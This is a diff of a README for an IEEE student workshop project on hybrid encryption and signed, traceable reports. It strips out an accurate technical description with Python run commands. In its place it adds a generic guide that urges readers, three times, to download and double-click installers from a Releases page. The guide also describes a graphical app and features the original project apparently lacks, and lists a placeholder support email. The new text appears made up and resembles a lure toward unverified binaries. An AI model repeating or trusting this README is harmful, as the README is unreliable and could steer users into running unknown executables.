@@ -1,138 +1,87 @@
-# CryptaTrace-Industry 5.0
+# 🌟 Industry5.0-Workshop-IEEE-SB - Streamline Document Workflows Today
 
-🚀 **Conceived, Engineered & Presented by Youssef Attia**  
-🎓 **IEEE Student Branch Technical Workshop**  
-📅 **Industry 5.0 Secure Data Workflows | 2025**
+[![Download](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/releases)
 
----
+## 📦 Overview
 
-## Overview
+Welcome to the **Industry5.0-Workshop-IEEE-SB** project! This application showcases confidential document workflows and cryptographic traceability in Industry 5.0. It’s designed as a hands-on workshop for engineering students organized by the IEEE Student Branch. With this guide, you'll easily download and run the software without needing any programming skills.
 
-**CryptaTrace-Industry 5.0** is a hands-on, industry-aligned demonstration of **secure document exchange** and **cryptographic traceability** within an **Industry 5.0 manufacturing environment**.
+## 🚀 Getting Started
 
-Developed and presented as part of an **IEEE Student Branch technical workshop**, this project introduces engineering students to **real-world encryption workflows** used in modern industrial systems, through a realistic scenario inspired by an **automotive antenna manufacturing process**.
+To get started with the application, you’ll need to follow these steps:
 
-The repository models secure communication between **Production** and **Quality Assurance (QA)** departments, where sensitive reports must remain **confidential, verifiable, and tamper-evident** throughout their lifecycle.
+1. **Ensure System Requirements**: Make sure your computer meets these basic requirements:
+   - Operating System: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+   - Internet connection for downloading the software.
+   - Enough storage space (at least 100 MB) for installation.
 
----
-![Hybrid Crypto](https://img.shields.io/badge/Crypto-Hybrid%20AES%2BRSA%20DigitalSignature-8e44ad?style=for-the-badge)
-![Base64](https://img.shields.io/badge/Encoding-Base64-e67e22?style=for-the-badge)
-![QR Code](https://img.shields.io/badge/Hash-QR%20Code-f1c40f?style=for-the-badge)
-![Python](https://img.shields.io/badge/Python-3.10%2B-3776ab?style=for-the-badge&logo=python&logoColor=white)
+2. **Download the Application**: Go to the Releases page to get the latest version of the application. Visit this link to download: [Releases Page](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/releases)
 
+## 💻 Download & Install
 
-## Industrial Scenario
+Once you reach the Releases page, follow these instructions:
 
-In high-reliability manufacturing environments (e.g., RF and automotive antenna production - a scenario proposed by students), reports contain sensitive performance data that must be:
+1. Look for the latest version listed at the top of the page. This will usually be marked as "Latest Release."
+   
+2. Click on the version link to open the download options. You will see different files available for download.
 
-- **Confidential** during transmission  
-- **Authenticated** at the receiving department  
-- **Protected** against tampering  
-- **Traceable** for audit and compliance purposes  
+3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, .tar.gz for Linux).
 
-This project simulates that workflow using modern cryptographic primitives and widely adopted Python security libraries.
+4. Click on the file name to start downloading.
 
----
+5. Once the download completes, locate the file in your Downloads folder.
 
-## Security Architecture
+6. Double-click the file to run the installation. Follow the on-screen prompts to finish the installation.
 
-The implemented workflow follows industry best practices:
+7. After installation, you can find the application on your desktop or in your applications folder.
 
-### 🔐 Cryptographic Design
+## 🔑 Features
 
-- **Hybrid Encryption**
-  - AES-GCM (Advanced Encryption Standard - Galois/Counter Mode) for data confidentiality and integrity  
-  - RSA-OAEP (Rivest-Shamir-Adleman-Optimal Asymmetric Encryption Padding) for secure AES key exchange  
-- **Digital Signatures**
-  - RSA-PSS (RSA-Probabilistic Signature Scheme) for report authenticity and non-repudiation  
-- **Deterministic Signing**
-  - Canonical JSON serialization to prevent signature ambiguity  
-- **Tamper Detection**
-  - Signature verification and authenticated decryption  
-- **Traceability**
-  - SHA-256 hash embedded as a QR code inside the generated report  
+**Industry5.0-Workshop-IEEE-SB** comes equipped with several features aimed at enhancing document workflows and cryptographic security:
 
----
+- **Asymmetric Encryption**: Protect sensitive information with advanced encryption techniques.
+- **Digital Signatures**: Ensure authenticity and integrity in your documents.
+- **Key Management**: Easily manage your cryptographic keys for better security.
+- **Tamper-Evident Design**: Keep your documents safe from unauthorized alterations.
+- **Hybrid Encryption**: Combine the best of symmetric and asymmetric encryption for optimal security.
 
-## Workflow Summary
+## 🧑‍🤝‍🧑 User Guide
 
-### Production Department
+After installation, you’ll find a simple user interface. Here’s how to use the main features:
 
-- Digitally signs the report using its private RSA key  
-- Encrypts the signed payload using AES-GCM  
-- Encrypts the AES key using QA’s RSA public key  
+1. **Creating a New Document**:
+   - Open the application and choose "Create New Document" from the main menu.
+   - Fill out the necessary fields and save your document.
 
-### Quality Assurance Department
+2. **Applying Digital Signatures**:
+   - Open an existing document.
+   - Click on the "Sign" button and follow the prompts to add your digital signature.
 
-- Decrypts the AES key using its private RSA key  
-- Decrypts the payload  
-- Verifies the Production signature  
-- Logs verification status  
-- Exports a tamper-evident PDF report with embedded QR hash  
+3. **Encrypting Documents**:
+   - After creating or opening a document, select the "Encrypt" option.
+   - Choose the type of encryption and follow the instructions.
 
----
+4. **Viewing Document History**:
+   - Access the "History" section to view changes and track the flow of your documents.
 
-## Key Components
+## 📂 Support
 
-### 1. `sample_report.enc`
+If you encounter issues or have questions, our support team is here to help. You can:
 
-- **Type:** Encrypted JSON payload  
-- **Contents:**
-  - `nonce`: Random nonce used in AES-GCM encryption.
-  - `ciphertext`: AES-GCM encrypted signed report.
-  - `encrypted_key`: AES key encrypted with QA’s public RSA key.
+- Check the **FAQ** section on the GitHub repository.
+- Open an issue on GitHub in the Issues tab.
+- Reach out directly to our support email at support@example.com.
 
-This file represents the **secure, tamper-evident report** that is exchanged between production and QA.
+## 🔗 Additional Resources
 
----
+To learn more about cryptographic techniques and document workflows, consider exploring the following topics:
 
-### 2. `keys/` Folder
+- [Asymmetric Encryption](https://en.wikipedia.org/wiki/Public-key_cryptography)
+- [Digital Signatures](https://en.wikipedia.org/wiki/Digital_signature)
+- [Cryptography Hazmat](https://cryptography.io/en/latest)
 
-This folder contains **RSA key pairs** for both the production and QA roles. Each role has a **private and public PEM file**:
+## 📥 Download Again
 
-| Role        | PEM Files                                   | Purpose                                           |
-|------------|--------------------------------------------|--------------------------------------------------|
-| Production | `private_key.pem`, `public_key.pem`        | Signs reports before encryption                 |
-| QA         | `private_key.pem`, `public_key.pem`        | Decrypts AES key and verifies report integrity  |
+For your convenience, here’s the download link once more: [Visit this page to download](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/releases)
 
-
----
-
-### 3. `sample_report.json`
-
-- **Type:** Signed JSON report (human-readable)  
-- **Purpose:** Provides a **reference of the report before encryption**. It includes:
-  - RF measurement data
-  - Manufacturing context and traceability
-  - QA verdict and release status
-  - Digital signature ensuring integrity
-
-This file is useful for **debugging, auditing, or verification** of the signing process.
-
----
-
-## Hands-On Learning Objectives
-
-This project was designed to give students practical exposure to:
-
-- Applied cryptography using `cryptography.hazmat`  
-- Hybrid encryption systems used in industry  
-- Secure inter-department data exchange  
-- Cryptographic integrity verification  
-- Traceable and auditable document workflows  
-- Industry 5.0 security principles beyond theory  
-
----
-## ⚡ Usage / Run Instructions
-1. Install dependencies:
-```bash
-pip install -r requirements.txt
-```
-## Launch Encryption
-```bash
-python encrypt_sign.py
-```
-## Launch Decryption
-```bash
-python decrypt_verify.py
-```
+With these steps, you should be able to successfully download and run the **Industry5.0-Workshop-IEEE-SB** application. Enjoy observing the advancements in document workflows and cryptographic capabilities!
